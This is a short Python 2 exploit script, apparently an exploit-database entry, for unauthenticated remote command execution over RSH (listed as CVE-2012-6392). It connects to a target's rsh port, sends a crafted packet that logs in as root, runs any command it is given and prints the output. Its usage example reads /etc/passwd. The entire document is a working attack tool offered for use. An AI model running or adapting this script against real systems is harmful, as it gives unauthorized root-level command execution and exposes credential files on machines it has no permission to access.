#!/usr/bin/python
 
# Exploit Title: RSH Unauthorized Asccess RCE
# Google Dork: -
# Date: 23/06/2017
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: -
# Software Link: -
# Version: -
# Tested on: Linux Kernel 2.6.18
# CVE : CVE-2012-6392
# Usage: exploit.py <target ip> <port> <command e.g. "uname -m">"
# Example: exploit.py 192.168.2.3 514 "cat /etc/passwd"

import socket
import struct
import sys
import time

def exploit(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        PACKET_DATA = "\x00\x72\x6f\x6f\x74\x00\x72\x6f\x6f\x74\x00"+command+"\x00\x0a"
        # Send payload to target
        print "[+] Sending PACKET_DATA"
        
        sock.send(PACKET_DATA)
        # Parse the response back
        print "[*] Result:\n"
        while True:
            response = sock.recv(2048)
            if not response: break
            print response

    except Exception as ex:
        print >> sys.stderr, "[-] Socket error: \n\t%s" % ex
        exit(-3)
    sock.close()

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
        command = sys.argv[3]
        exploit(target, port, command)
    except IndexError:
         print("Usage: python exploit.py <target ip> <port> <command e.g. \"uname -m\">")
    exit(0)